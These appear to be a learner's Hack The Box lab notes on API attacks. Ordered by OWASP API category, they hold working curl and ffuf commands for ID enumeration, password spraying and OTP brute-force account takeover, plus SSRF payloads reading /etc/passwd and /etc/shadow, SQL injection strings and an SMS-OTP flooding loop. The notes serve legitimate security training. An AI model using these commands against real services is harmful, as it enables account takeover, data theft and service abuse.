# Introduction to API Attacks

**Commands**

**Payloads**

**Code**

**Paths / Endpoints**

**Tools / Services / Servers**

REST  
SOAP  
GraphQL  
gRPC

**Parameters**

**DOM Elements**

**Reusable Snippets**

**Request Patterns**

---




# Broken Object Level Authorization 

**Commands**

```
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://154.57.164.80:31638/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc3MzYwNDIwOSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.06UXIOqPdw9zF1Pz7oZ7ccpcj8u7RdjUYr-zzQpwZbpuZIR9hQIkKVbumXJFwdW66cVJ9DtC9oCGsnPY1ldUAg' | jq
done
```

**Payloads**

[htbpentester1@pentestercompany.com](mailto:htbpentester1@pentestercompany.com):HTBPentester1  
[htbpentester2@pentestercompany.com](mailto:htbpentester2@pentestercompany.com):HTBPentester2

**Code**

```
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT_TOKEN>' | jq
done
```

**Paths / Endpoints**

/api/v1/authentication/suppliers/sign-in  
/api/v1/suppliers/current-user  
/api/v1/roles/current-user  
/api/v1/supplier-companies/current-user  
/api/v1/supplier-companies/yearly-reports/{ID}

**Tools / Services / Servers**

Swagger UI  
curl  
jq  
JWT

**Parameters**

ID

**DOM Elements**

Authorize

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>

**Request Patterns**

GET /api/v1/supplier-companies/yearly-reports/{ID}

```
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://154.57.164.80:31638/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc3MzYwNDIwOSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.06UXIOqPdw9zF1Pz7oZ7ccpcj8u7RdjUYr-zzQpwZbpuZIR9hQIkKVbumXJFwdW66cVJ9DtC9oCGsnPY1ldUAg' | jq
done
```

---

# Broken Authentication

**Commands**

```bash
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```

**Payloads**

[htbpentester3@hackthebox.com](mailto:htbpentester3@hackthebox.com):HTBPentester3  
[IsabellaRichardson@gmail.com](mailto:IsabellaRichardson@gmail.com):qwerasdfzxcv  
[MasonJenkins@ymail.com](mailto:MasonJenkins@ymail.com)

[OlawaleJones@yandex.com](mailto:OlawaleJones@yandex.com)  
[IsabellaRichardson@gmail.com](mailto:IsabellaRichardson@gmail.com)  
[WenSalazar@zoho.com](mailto:WenSalazar@zoho.com)

pass  
123456

**Code**

```json
{"Email": "EMAIL", "Password": "PASS"}
```

```json
{
"name": "HTBPentester3",
"email": "htbpentester3@hackthebox.com",
"phoneNumber": "0000000000",
"birthDate": "1990-01-01",
"password": "123456"
}
```

**Paths / Endpoints**

/api/v1/authentication/customers/sign-in  
/api/v1/customers/current-user  
/api/v1/customers  
/api/v1/roles/current-user  
/api/v1/customers/current-user

**Tools / Services / Servers**

ffuf  
Swagger UI  
JWT  
SecLists

**Parameters**

Email  
Password

**DOM Elements**

Authorize

**Reusable Snippets**

Content-Type: application/json

**Request Patterns**

POST /api/v1/authentication/customers/sign-in  
GET /api/v1/customers/current-user  
GET /api/v1/customers  
PATCH /api/v1/customers/current-user

```
ffuf -u http://154.57.164.83:30264/api/v1/authentication/customers/passwords/resets \
-X POST \
-H "Content-Type: application/json" \
-d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' \
-w <(seq -w 0000 9999):FUZZ \
-t 50 \
-mr '"SuccessStatus":true'
```


### Generate OTP

Run:

```bash
curl -X POST \
http://154.57.164.83:30264/api/v1/authentication/customers/passwords/resets/email-otps \
-H "Content-Type: application/json" \
-d '{"Email":"MasonJenkins@ymail.com"}'
```

You should see:

```
{"SuccessStatus":true}
```

### Immediately run ffuf

Do **not wait**. Run right after:

```bash
ffuf -u http://154.57.164.83:30264/api/v1/authentication/customers/passwords/resets \
-X POST \
-H "Content-Type: application/json" \
-d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' \
-w <(seq -w 0000 9999):FUZZ \
-t 50 \
-mr '"SuccessStatus":true'
```

This should return **one result** like:

```
FUZZ: 3817
```

That is the correct OTP.
## Then login

```
POST /api/v1/authentication/customers/sign-in
```

Body:

```json
{
 "Email":"MasonJenkins@ymail.com",
 "Password":"NewP@ssw0rd1"
}
```

You will receive a **JWT token**.

## Get the flag

```
GET /api/v1/customers/payment-options/current-user
```

Header:

```
Authorization: Bearer <JWT>
```

The response contains the **HTB flag**.

# Broken Object Property Level Authorization 

**Commands**

GET /api/v1/authentication/customers/sign-in

GET /api/v1/roles/current-user

GET /api/v1/suppliers

GET /api/v1/authentication/suppliers/sign-in

GET /api/v1/supplier-companies/current-user

PATCH /api/v1/supplier-companies

GET /api/v1/supplier-companies/current-user

**Payloads**

[htbpentester4@hackthebox.com](mailto:htbpentester4@hackthebox.com):HTBPentester4  
[htbpentester5@hackthebox.com](mailto:htbpentester5@hackthebox.com):HTBPentester5  
[htbpentester6@pentestercompany.com](mailto:htbpentester6@pentestercompany.com):HTBPentester6  
[htbpentester7@hackthebox.com](mailto:htbpentester7@hackthebox.com):HTBPentester7

**Code**

```json
{
"id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
"isExemptedFromMarketplaceFee": 1,
"certificateOfIncorporationURI": "string"
}
```

**Paths / Endpoints**

/api/v1/authentication/customers/sign-in  
/api/v1/authentication/suppliers/sign-in  
/api/v1/roles/current-user  
/api/v1/suppliers  
/api/v1/supplier-companies  
/api/v1/supplier-companies/current-user

**Tools / Services / Servers**

Swagger UI  
JWT

**Parameters**

id  
isExemptedFromMarketplaceFee  
certificateOfIncorporationURI

**DOM Elements**

Authorize

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>  
Content-Type: application/json

**Request Patterns**

GET /api/v1/suppliers

PATCH /api/v1/supplier-companies

---



# Unrestricted Resource Consumption 

**Commands**

```bash
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

```bash
dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10
```

```bash
curl -O http://94.237.51.179:51135/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe
```

**Payloads**

[htbpentester8@pentestercompany.com](mailto:htbpentester8@pentestercompany.com):HTBPentester8

certificateOfIncorporation.pdf  
reverse-shell.exe

**Code**

```bash
dd if=/dev/urandom of=<filename> bs=1M count=<size>
```

**Paths / Endpoints**

/api/v1/authentication/suppliers/sign-in  
/api/v1/roles/current-user  
/api/v1/supplier-companies/certificates-of-incorporation  
/api/v1/supplier-companies/current-user

/SupplierCompaniesCertificatesOfIncorporations/

**Tools / Services / Servers**

dd  
curl  
Swagger UI  
JWT  
ASP.NET Core

**Parameters**

CompanyID

**DOM Elements**

Choose File

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>  
Content-Type: multipart/form-data

**Request Patterns**

POST /api/v1/supplier-companies/certificates-of-incorporation

---

```
for i in $(seq 1 10000); do curl -X 'POST' \ 'http://154.57.164.77:31905/api/v1/authentication/customers/passwords/resets/sms-otps' \ -H 'accept: application/json' \ -H 'Content-Type: application/json' \ -d '{ "Email": "htbpentester8@pentestercompany.com" }'; \ done
```

# Broken Function Level Authorization 

**Commands**

GET /api/v1/authentication/customers/sign-in

GET /api/v1/roles/current-user

GET /api/v1/products/discounts

**Payloads**

[htbpentester9@hackthebox.com](mailto:htbpentester9@hackthebox.com):HTBPentester9

**Code**

**Paths / Endpoints**

/api/v1/authentication/customers/sign-in  
/api/v1/roles/current-user  
/api/v1/products/discounts

**Tools / Services / Servers**

Swagger UI  
JWT

**Parameters**

**DOM Elements**

Authorize

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>

**Request Patterns**

GET /api/v1/products/discounts

---


# Unrestricted Access to Sensitive Business Flows

**Commands**

GET /api/v1/authentication/customers/sign-in

GET /api/v1/products/discounts

GET /api/v1/customers

GET /api/v1/customers/{ID}

**Payloads**

[htbpentester9@hackthebox.com](mailto:htbpentester9@hackthebox.com):HTBPentester9

daa8c984-ba84-4265-8d88-12d6607e511c

**Code**

**Paths / Endpoints**

/api/v1/authentication/customers/sign-in  
/api/v1/products/discounts  
/api/v1/customers  
/api/v1/customers/{ID}

**Tools / Services / Servers**

Swagger UI  
JWT

**Parameters**

ID

**DOM Elements**

Authorize

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>

**Request Patterns**

GET /api/v1/products/discounts  
GET /api/v1/customers/{ID}

---



# Server Side Request Forgery

**Commands**

POST /api/v1/authentication/suppliers/sign-in

GET /api/v1/roles/current-user

GET /api/v1/supplier-companies/current-user

POST /api/v1/supplier-companies/certificates-of-incorporation

PATCH /api/v1/supplier-companies

GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation

**Payloads**

[htbpentester10@pentestercompany.com](mailto:htbpentester10@pentestercompany.com):HTBPentester10  
[htbpentester11@pentestercompany.com](mailto:htbpentester11@pentestercompany.com):HTBPentester11

file:///etc/passwd  
file:///etc/shadow  
file:///etc/flag.conf

**Code**

```json
{
"id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
"isExemptedFromMarketplaceFee": 0,
"certificateOfIncorporationPDFFileURI": "file:///etc/passwd"
}
```

```json
{
"id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
"isExemptedFromMarketplaceFee": 0,
"certificateOfIncorporationPDFFileURI": "file:///etc/flag.conf"
}
```

**Paths / Endpoints**

/api/v1/authentication/suppliers/sign-in  
/api/v1/roles/current-user  
/api/v1/supplier-companies/current-user  
/api/v1/supplier-companies  
/api/v1/supplier-companies/{ID}/certificates-of-incorporation  
/api/v1/supplier-companies/certificates-of-incorporation

**Tools / Services / Servers**

Swagger UI  
JWT  
CyberChef

**Parameters**

id  
certificateOfIncorporationPDFFileURI

**DOM Elements**

Authorize

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>  
file:///etc/passwd  
file:///etc/flag.conf

**Request Patterns**

PATCH /api/v1/supplier-companies  
GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation

---


# Security Misconfiguration 

**Commands**

GET /api/v1/authentication/suppliers/sign-in

GET /api/v1/roles/current-user

GET /api/v1/products/{Name}/count

**Payloads**

[htbpentester12@pentestercompany.com](mailto:htbpentester12@pentestercompany.com):HTBPentester12  
[htbpentester13@hackthebox.com](mailto:htbpentester13@hackthebox.com):HTBPentester13

laptop  
laptop'  
laptop' OR 1=1 --  
' OR 1=1 --

**Code**

```text
laptop' OR 1=1 --
```

```text
' OR 1=1 --
```

**Paths / Endpoints**

/api/v1/authentication/suppliers/sign-in  
/api/v1/roles/current-user  
/api/v1/products/{Name}/count

**Tools / Services / Servers**

Swagger UI  
JWT

**Parameters**

Name

**DOM Elements**

Authorize

**Reusable Snippets**

Authorization: Bearer <JWT_TOKEN>

**Request Patterns**

GET /api/v1/products/{Name}/count

---


# Improper Inventory Management 

**Commands**

GET /api/v0/customers/deleted

GET /api/v0/supplier-companies/deleted

GET /api/v0/supplier-companies/deleted/{ID}

**Payloads**

c250cb38-96e3-4ccf-9df2-0a03146a2d0b

**Code**

**Paths / Endpoints**

/api/v0/customers/deleted  
/api/v0/supplier-companies/deleted  
/api/v0/supplier-companies/deleted/{ID}

**Tools / Services / Servers**

Swagger UI

**Parameters**

ID

**DOM Elements**

**Reusable Snippets**

**Request Patterns**

GET /api/v0/supplier-companies/deleted/{ID}

---



# Unsafe Consumption of APIs 

**Commands**

GET /api/v0/suppliers/deleted

GET /api/v0/customers/deleted

**Payloads**

Yara MacDonald

**Code**

**Paths / Endpoints**

/api/v0/suppliers/deleted  
/api/v0/customers/deleted

**Tools / Services / Servers**

Swagger UI

**Parameters**

**DOM Elements**

**Reusable Snippets**

**Request Patterns**

GET /api/v0/suppliers/deleted

---

